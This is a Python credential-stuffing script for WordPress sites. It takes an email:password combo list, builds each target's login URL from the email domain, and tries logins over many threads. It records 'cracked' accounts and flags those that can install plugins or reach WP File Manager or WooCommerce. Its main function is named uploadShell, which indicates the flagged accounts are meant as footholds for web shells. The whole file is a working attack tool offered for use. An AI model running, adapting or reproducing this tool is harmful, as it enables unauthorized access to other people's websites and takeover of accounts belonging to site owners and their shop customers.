import requests
from multiprocessing.dummy import Pool as ThreadPool
from colorama import init, Fore
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests.exceptions import RequestException

# Initialize colorama
init(autoreset=True)

# Disable insecure request warnings
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Define color codes for terminal output
G = Fore.GREEN
W = Fore.WHITE
R = Fore.RED
C = Fore.CYAN

def uploadShell(site_combo):
    try:
        email, password = site_combo.split(':')
        username = email.split('@')[0]
        domain = email.split('@')[1]
        https_site = f"https://{domain}/wp-login.php"
        http_site = f"http://{domain}/wp-login.php"
        
        asuna_https = f"{https_site}#{username}@{password}"
        asuna_http = f"{http_site}#{username}@{password}"
        
        def check_login(asuna, site):
            site, user, pasw = asuna.split('#')[0], asuna.split('#')[1].split('@')[0], asuna.split('@')[1]
            hd = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Safari/537.36'}
            r = requests.Session()
            cek = r.get(site, timeout=15, verify=False)
            if cek.status_code in [200, 403] or 'Powered by WordPress' in cek.text or '/wp-login.php' in cek.text:
                login = r.post(site, headers=hd, data={'log': user, 'pwd': pasw}, timeout=10, verify=False)
                if 'wp-admin/profile.php' in login.text or 'Found' in login.text or '/wp-admin' in login.text:
                    print(f'{W}[{G}+{W}] {asuna} --> {G}Login Success!{W}')
                    with open('Result/loginSuccess_Cracked.txt', 'a') as saveLog:
                        saveLog.write(site + '#' + user + '@' + pasw + '\n')
                    if 'WooCommerce' in login.text:
                        print(f'{W}[{G}+{W}] WooCommerce!')
                        with open('Result/WooCommerce_Cracked.txt', 'a') as assz:
                            assz.write(site + '#' + user + '@' + pasw + '\n')
                    if 'WP File Manager' in login.text:
                        print(f'{W}[{G}+{W}] WP File Manager!')
                        with open('Result/wpfilemanager_Cracked.txt', 'a') as assz:
                            assz.write(site + '#' + user + '@' + pasw + '\n')
                    if 'plugin-install.php' in login.text:
                        print(f'{W}[{G}+{W}] Plugin install!')
                        with open('Result/plugin-install_Cracked.txt', 'a') as assz:
                            assz.write(site + '#' + user + '@' + pasw + '\n')
                else:
                    print(f'{W}[{R}-{W}] {asuna} --> {R}Login Failed!{W}')
            else:
                print(f'{W}[{R}-{W}] {site} --> {R}Site not accessible or not WordPress!{W}')

        try:
            check_login(asuna_https, https_site)
        except RequestException as e:
            error_message = str(e).split(":")[0]
            if "HTTPSConnectionPool" in error_message:
                try:
                    check_login(asuna_http, http_site)
                except RequestException as e:
                    with open('deadSites.txt', 'a') as deadSites:
                        deadSites.write(domain + '\n')
            else:
                with open('deadSites.txt', 'a') as deadSites:
                    deadSites.write(domain + '\n')
                
    except Exception as e:
        print(f'{R}An error occurred!{W}\n{e}')

print(f'{C}\n        Wordpress Login Checker | GOOD RESULT: plugin-install.txt, wpfilemanager.txt WooCommerce.txt  {W}\n')

combo_file = input('        Combo list file: ')
combos = open(combo_file, 'r').read().splitlines()
Thread = int(input('        Thread: '))

pool = ThreadPool(Thread)
pool.map(uploadShell, combos)
pool.close()
pool.join()
